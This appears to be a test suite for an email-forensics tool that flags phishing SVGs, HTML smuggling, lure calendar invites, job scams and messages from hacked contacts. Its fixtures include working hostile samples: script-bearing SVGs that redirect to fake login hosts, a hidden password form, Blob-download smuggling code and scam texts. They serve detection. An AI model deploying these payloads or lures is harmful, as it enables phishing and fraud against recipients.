import { analyzeRawEmail } from '../src/core/analyze';
import { analyzeFile } from '../src/forensics';
import { analyzeMarkup } from '../src/forensics/markup';
import { parseIcs } from '../src/analyzers/calendar';
import { addTraits, fingerprintFindings, hourBand, senderTraits } from '../src/analyzers/fingerprint';
import { EMPTY_HISTORY, recordSender } from '../src/analyzers/history';
import { parseEmail } from '../src/core/parse';
import type { AuthSummary } from '../src/core/types';

const enc = (s: string) => new TextEncoder().encode(s);
const b64 = (s: string) => Buffer.from(s).toString('base64');
const ids = (r: { findings: { id: string }[] }) => r.findings.map((f) => f.id);

/** A multipart email with an optional extra part. */
function eml(opts: { from?: string; subject?: string; body: string; date?: string; part?: string; auth?: string }): string {
  const lines = [
    'Delivered-To: me@example.org',
    opts.auth ?? 'Authentication-Results: mx.google.com; spf=pass smtp.mailfrom=sender.example; dkim=pass header.d=sender.example; dmarc=pass header.from=sender.example',
    `From: ${opts.from ?? 'Alex <alex@sender.example>'}`,
    'To: me@example.org',
    `Subject: ${opts.subject ?? 'Hello'}`,
    `Date: ${opts.date ?? 'Tue, 10 Nov 2026 10:15:00 +0000'}`,
    `Message-ID: <${Math.random().toString(36).slice(2)}@${(opts.from ?? 'alex@sender.example').match(/@([^>\s]+)/)![1]}>`,
    'MIME-Version: 1.0',
    'Content-Type: multipart/mixed; boundary=B',
    '',
    '--B',
    'Content-Type: text/plain; charset=utf-8',
    '',
    opts.body,
  ];
  if (opts.part) lines.push('--B', opts.part);
  lines.push('--B--', '');
  return lines.join('\r\n');
}

describe('SVG and HTML active content', () => {
  it('flags an SVG that runs a script and redirects to a hidden base64 address', async () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg"><script><![CDATA[var u=atob("${b64('https://login.micr0soft-auth.top/?e=victim@corp.example')}");window.location.href=u;]]></script></svg>`;
    const f = await analyzeFile(enc(svg), 'Payment_Advice.svg');
    const got = f.anomalies.map((a) => a.id);
    expect(got).toEqual(expect.arrayContaining(['svg-script', 'markup-redirect', 'markup-hidden-payload']));
    expect(f.links.map((l) => l.url)).toContain('https://login.micr0soft-auth.top/?e=victim@corp.example');
    expect(f.anomalies.find((a) => a.id === 'svg-script')?.attack).toBe('T1027.017');
  });

  it('finds a login form hidden in foreignObject, even behind XML and DOCTYPE padding', async () => {
    const svg = `<?xml version="1.0"?>\n<!-- logo -->\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "x">\n<svg xmlns="http://www.w3.org/2000/svg" onload="go()"><foreignObject width="400" height="300"><form action="https://x.top/p"><input type="password" name="p"></form></foreignObject></svg>`;
    const f = await analyzeFile(enc(svg), 'scan.svg');
    expect(f.kind).toBe('html');
    expect(f.anomalies.find((a) => a.id === 'svg-embedded-page')?.severity).toBe('critical');
    expect(f.anomalies.map((a) => a.id)).toContain('markup-event-handler');
  });

  it('notices file smuggling, CAPTCHA gates and a built-in recipient address', () => {
    const html = `<html><body><div class="cf-turnstile"></div><script>const email="ceo@corp.example";const b=new Blob([data]);a.href=URL.createObjectURL(b);a.download="invoice.zip";location.replace("https://evil.top/" + email)</script></body></html>`;
    const r = analyzeMarkup(html, false);
    expect(r.anomalies.map((a) => a.id)).toEqual(expect.arrayContaining(['markup-smuggling', 'markup-captcha', 'markup-personalised', 'markup-redirect']));
  });

  it('leaves an ordinary logo SVG alone', async () => {
    const svg = '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10"><a xlink:href="https://example.com/"><circle cx="5" cy="5" r="4" fill="#61892F"/></a></svg>';
    const f = await analyzeFile(enc(svg), 'logo.svg');
    expect(f.anomalies.filter((a) => a.severity !== 'info' && a.severity !== 'good')).toEqual([]);
  });

  it('raises a High risk verdict for an email carrying a redirecting SVG', async () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg"><script>window.location="https://docs-share.top/v"</script></svg>`;
    const r = await analyzeRawEmail(eml({ body: 'Please see the remittance attached.', part: `Content-Type: image/svg+xml; name=Remittance.svg\r\nContent-Disposition: attachment; filename=Remittance.svg\r\nContent-Transfer-Encoding: base64\r\n\r\n${b64(svg)}` }));
    expect(r.verdict).not.toBe('clear');
    expect(r.links.some((l) => l.host === 'docs-share.top')).toBe(true);
  });
});

describe('calendar invites', () => {
  const ics = (body: string, method = 'REQUEST') => `BEGIN:VCALENDAR\r\nVERSION:2.0\r\nMETHOD:${method}\r\nBEGIN:VEVENT\r\n${body}\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n`;
  const part = (text: string) => `Content-Type: text/calendar; method=REQUEST; charset=UTF-8\r\n\r\n${text}`;

  it('unfolds long lines and reads organiser, links and escapes', () => {
    const inv = parseIcs(ics('SUMMARY:Q4 bonus\\, review\r\nORGANIZER;CN="HR, Payroll":mailto:HR@corp.example\r\nDESCRIPTION:Open https://bonus-portal\r\n .top/x\\nthanks\r\nURL:https://bonus-portal.top/u'));
    expect(inv?.events[0]).toMatchObject({ summary: 'Q4 bonus, review', organizer: { name: 'HR, Payroll', address: 'hr@corp.example' }, urls: ['https://bonus-portal.top/u'] });
    expect(inv?.events[0]?.description).toContain('https://bonus-portal.top/x');
  });

  it('flags an invite that sends you to a non-meeting site about a payment', async () => {
    const r = await analyzeRawEmail(eml({ subject: 'Invitation: Payroll update', body: 'You have been invited.', part: part(ics('SUMMARY:Payroll update - action required\r\nORGANIZER:mailto:hr@payroll-team.top\r\nDESCRIPTION:Confirm your bank details for salary: https://payroll-verify.top/login')) }));
    expect(ids(r)).toEqual(expect.arrayContaining(['calendar-lure', 'calendar-organizer-mismatch']));
    expect(r.links.find((l) => l.domain === 'payroll-verify.top')?.origin).toBe('calendar invite');
    expect(r.attachments.some((a) => a.filename === 'invite.ics')).toBe(true);
    expect(r.verdict).not.toBe('clear');
  });

  it('flags a callback number in an invite', async () => {
    const r = await analyzeRawEmail(eml({ body: 'Renewal', part: part(ics('SUMMARY:Your subscription renewal $499.99\r\nDESCRIPTION:If you did not authorize this charge call our billing team at +1 (808) 555-0142 to cancel.')) }));
    expect(ids(r)).toContain('calendar-callback');
  });

  it('keeps a normal Zoom or Teams invite quiet', async () => {
    const zoom = await analyzeRawEmail(eml({ body: 'Weekly sync', part: part(ics('SUMMARY:Weekly sync\r\nORGANIZER;CN=Alex:mailto:alex@sender.example\r\nLOCATION:https://us02web.zoom.us/j/123456789\r\nDESCRIPTION:Join Zoom Meeting https://us02web.zoom.us/j/123456789?pwd=abc')) }));
    expect(ids(zoom).filter((i) => i.startsWith('calendar-'))).toEqual([]);
    const teams = await analyzeRawEmail(eml({ body: 'Design review', part: part(ics('SUMMARY:Design review\r\nORGANIZER:mailto:alex@sender.example\r\nX-MICROSOFT-SKYPETEAMSMEETINGURL:https://teams.microsoft.com/l/meetup-join/19%3a')) }));
    expect(ids(teams).filter((i) => i.startsWith('calendar-'))).toEqual([]);
  });

  it('does not treat Google Calendar sending on someone’s behalf as a mismatch', async () => {
    const r = await analyzeRawEmail(eml({ from: 'Google Calendar <calendar-notification@google.com>', auth: 'Authentication-Results: mx.google.com; spf=pass smtp.mailfrom=google.com; dkim=pass header.d=google.com; dmarc=pass header.from=google.com', body: 'Invitation', part: part(ics('SUMMARY:Lunch\r\nORGANIZER:mailto:friend@gmail.com\r\nLOCATION:https://meet.google.com/abc-defg-hij')) }));
    expect(ids(r)).not.toContain('calendar-organizer-mismatch');
  });
});

describe('job-offer scams', () => {
  it('catches a task scam that moves to Telegram', async () => {
    const r = await analyzeRawEmail(eml({ from: 'Sarah HR <sarah.recruit2026@gmail.com>', auth: 'Authentication-Results: mx.google.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com', subject: 'Remote job opportunity', body: 'Hello, we reviewed your profile for a part-time remote job. You will rate products online, 30 tasks a day, and earn $300 per day. No interview needed. Contact our HR manager on Telegram: t.me/hr_desk_jobs' }));
    const f = r.findings.find((x) => x.id === 'job-scam');
    expect(f?.severity).toBe('critical');
    expect(r.verdict).toBe('high');
  });

  it('catches the fake-cheque equipment scam', async () => {
    const r = await analyzeRawEmail(eml({ subject: 'Job offer: Data Entry Clerk', body: 'Congratulations, following your interview you have the position. We will send you a check to purchase the equipment from our vendor. Deposit the check by mobile deposit and send the balance.' }));
    expect(r.findings.find((x) => x.id === 'job-scam')?.severity).toMatch(/high|critical/);
  });

  it('leaves real recruiting emails and job-site alerts alone', async () => {
    const recruiter = await analyzeRawEmail(eml({ subject: 'Interview for the Senior Engineer position', body: 'Hi, thanks for your application. We would like to invite you to an interview with our hiring team next Tuesday at our office or on Zoom. Please reply with times that work.' }));
    expect(ids(recruiter)).not.toContain('job-scam');
    const linkedin = await analyzeRawEmail(eml({ from: 'LinkedIn Job Alerts <jobalerts-noreply@linkedin.com>', auth: 'Authentication-Results: mx.google.com; spf=pass smtp.mailfrom=linkedin.com; dkim=pass header.d=linkedin.com; dmarc=pass header.from=linkedin.com', subject: '30+ new jobs for you', body: 'Remote job openings. Hiring now: part-time customer support, start immediately. Recruiter is hiring. Message the recruiter on WhatsApp.' }));
    expect(ids(linkedin)).not.toContain('job-scam');
  });
});

describe('hacked contacts', () => {
  const auth: AuthSummary = { server: 'mx.google.com', spf: 'pass', spfDomain: 'friend.example', dkim: 'pass', dkimDomains: ['friend.example'], dmarc: 'pass', dmarcDomain: 'friend.example', raw: 'x' };
  async function history(n: number, body = 'See you at lunch.', date = 'Tue, 10 Nov 2026 10:15:00 +0000') {
    let h = EMPTY_HISTORY;
    for (let i = 0; i < n; i++) {
      const raw = eml({ from: 'Pat <pat@friend.example>', body, date }).replace(/Message-ID: <[^>]+>/, `Message-ID: <m${i}@friend.example>`);
      const r = await analyzeRawEmail(raw);
      h = recordSender(h, r.email, Date.now(), senderTraits(r.email, auth, [], r.links));
    }
    return h;
  }

  it('reads the hour on the sender’s own clock', () => {
    expect(hourBand('Tue, 10 Nov 2026 03:12:00 +0530')).toBe('night');
    expect(hourBand('Tue, 10 Nov 2026 14:12:00 -0800')).toBe('afternoon');
    expect(hourBand(null)).toBeNull();
  });

  it('flags the first file-share link from a known contact, more strongly at 3 a.m.', async () => {
    const h = await history(5);
    const daytime = await analyzeRawEmail(eml({ from: 'Pat <pat@friend.example>', body: 'I shared a document with you: https://docs.google.com/document/d/abc/edit' }));
    const t1 = senderTraits(daytime.email, auth, [], daytime.links)!;
    const f1 = fingerprintFindings('pat@friend.example', h.senders['pat@friend.example']!.traits, t1);
    expect(f1.find((f) => f.id === 'contact-first-link')?.severity).toBe('medium');

    const night = await analyzeRawEmail(eml({ from: 'Pat <pat@friend.example>', date: 'Wed, 11 Nov 2026 03:40:00 +0000', body: 'Please sign in to view the file: https://friend-files.top/login' }));
    const t2 = senderTraits(night.email, auth, [], night.links)!;
    const f2 = fingerprintFindings('pat@friend.example', h.senders['pat@friend.example']!.traits, t2);
    expect(f2.find((f) => f.id === 'contact-first-link')).toMatchObject({ severity: 'high', title: expect.stringContaining('sign-in page') });
  });

  it('stays quiet for contacts who often share files, and for old histories', async () => {
    const h = await history(5, 'Notes: https://docs.google.com/document/d/x/edit');
    const r = await analyzeRawEmail(eml({ from: 'Pat <pat@friend.example>', body: 'New doc https://docs.google.com/document/d/y/edit' }));
    expect(fingerprintFindings('pat@friend.example', h.senders['pat@friend.example']!.traits, senderTraits(r.email, auth, [], r.links)!)).toEqual([]);
    // Histories saved before this change have no link counts: nothing to compare yet.
    const old = addTraits(undefined, { dkim: ['friend.example'], route: null, messageId: 'friend.example', mailer: null, replyTo: null });
    const oldX3 = addTraits(addTraits(old, { dkim: ['friend.example'], route: null, messageId: 'friend.example', mailer: null, replyTo: null }), { dkim: ['friend.example'], route: null, messageId: 'friend.example', mailer: null, replyTo: null });
    expect(fingerprintFindings('pat@friend.example', oldX3, senderTraits(r.email, auth, [], r.links)!)).toEqual([]);
  });

  it('parses without links for callers that do not pass them', async () => {
    const e = await parseEmail(eml({ body: 'x' }));
    expect(senderTraits(e, auth, [])).not.toHaveProperty('link');
  });
});

describe('calendar files in the Documents tab', () => {
  it('names the file and lists the invite’s links', async () => {
    const f = await analyzeFile(enc('BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\nSUMMARY:Payroll\r\nDESCRIPTION:https://payroll-verify.top/login\r\nLOCATION:https://zoom.us/j/1\r\nEND:VEVENT\r\nEND:VCALENDAR'), 'invite.ics');
    expect(f.magic.label).toBe('Calendar invite (iCalendar)');
    expect(f.links.map((l) => l.url)).toEqual(expect.arrayContaining(['https://payroll-verify.top/login', 'https://zoom.us/j/1']));
    expect(f.anomalies.find((a) => a.id === 'calendar-outside-link')?.detail).toBe('https://payroll-verify.top/login');
  });
});

describe('plain words for the newer checks', () => {
  it('uses a finding’s own everyday sentence when there is no hand-written one', async () => {
    const { plainSummary } = await import('../src/core/plain');
    const r = await analyzeRawEmail(eml({ from: 'Sarah HR <sarah.recruit2026@gmail.com>', auth: 'Authentication-Results: mx.google.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com', subject: 'Remote job opportunity', body: 'We reviewed your profile for a part-time remote job. You will rate products online, 30 tasks a day, and earn $300 per day. No interview needed. Contact our HR manager on Telegram: t.me/hr_desk_jobs' }));
    expect(plainSummary(r).reasons).toContain('This job offer has the signs of a scam: real employers never ask you to pay or move to a chat app.');
  });
});
